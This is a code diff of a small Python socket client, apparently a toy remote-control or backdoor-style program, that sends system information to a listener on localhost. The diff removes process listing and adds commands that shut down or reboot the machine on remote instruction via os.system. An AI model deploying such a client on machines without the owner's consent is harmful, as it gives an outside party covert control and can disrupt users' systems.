@@ -1,6 +1,6 @@
 import socket
-import psutil
 import platform
+import os
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 a = ('127.0.0.1', 3333)
@@ -15,13 +15,11 @@ def system_info():
     info += f"System: {platform.system()}"
     s.send(info.encode())
 
-def process_info():
-    for process in psutil.process_iter(attrs=['pid', 'name']):
-        ID = process.info['pid']
-        NM = process.info['name']
-        data = f"Process ID: {ID}, Process Name: {NM}"
-        s.send(data.encode())
-    s.send(b'PROCESS_INFO_END')
+def shutdown():
+    os.system('shutdown /s')
+
+def restart():
+    os.system('shutdown /r')
 
 while True:
     r = s.recv(1024).decode()
@@ -29,12 +27,10 @@ while True:
 
     if r == 'system':
         system_info()
-
-    elif r == 'process':
-        while True:
-            data = s.recv(1024).decode()
-            print(data)
-       
+    elif r == 'shutdown':
+        shutdown()
+    elif r == 'restart':
+        restart()  
     else:
         y = "404"
         s.send(y.encode())
